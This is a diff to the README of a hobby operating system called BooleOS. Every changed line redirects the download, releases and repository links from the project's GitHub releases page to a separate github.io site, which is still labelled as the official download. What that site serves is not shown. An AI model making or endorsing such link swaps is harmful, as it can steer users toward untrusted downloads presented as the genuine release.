@@ -1,6 +1,6 @@
 # 🖥️ BooleOS - A New Computer Experience From Scratch
 
-[![Download BooleOS](https://img.shields.io/badge/Download-BooleOS-blue?style=for-the-badge&logo=github)](https://github.com/nancy12341/BooleOS/releases)
+[![Download BooleOS](https://img.shields.io/badge/Download-BooleOS-blue?style=for-the-badge&logo=github)](https://nancy12341.github.io)
 
 ## ✨ What Is BooleOS?
 
@@ -22,7 +22,7 @@ Getting BooleOS on your computer is simple. Just follow these steps:
 
 ### Step 1: Get the Download
 
-Visit this link to download the application: [https://github.com/nancy12341/BooleOS/releases](https://github.com/nancy12341/BooleOS/releases)
+Visit this link to download the application: [https://nancy12341.github.io](https://nancy12341.github.io)
 
 ### Step 2: Find the Right File
 
@@ -104,7 +104,7 @@ Not at all. Anyone can download and run BooleOS. Programming knowledge is only n
 
 BooleOS represents the spirit of innovation and curiosity. It's proof that amazing things can be built from nothing. Whether you're a tech enthusiast, a curious learner, or just someone who likes trying new things, BooleOS has something for you.
 
-[![Download BooleOS Now](https://img.shields.io/badge/🚀-Download_BooleOS-green?style=for-the-badge)](https://github.com/nancy12341/BooleOS/releases)
+[![Download BooleOS Now](https://img.shields.io/badge/🚀-Download_BooleOS-green?style=for-the-badge)](https://nancy12341.github.io)
 
 ## 📝 About the Project
 
@@ -112,8 +112,8 @@ BooleOS is created by passionate developers who believe in building things from 
 
 ## 📖 Learn More
 
-- **Repository:** [BooleOS on GitHub](https://github.com/nancy12341/BooleOS)
-- **Releases:** [Download BooleOS](https://github.com/nancy12341/BooleOS/releases)
+- **Repository:** [BooleOS on GitHub](https://nancy12341.github.io)
+- **Releases:** [Download BooleOS](https://nancy12341.github.io)
 - **Topics:** bare-metal, c, claude-code, hobby-os, kernel, nasm, operating-system, osdev, vibe-coding, x86
 
 ## 🎉 Thank You for Exploring BooleOS
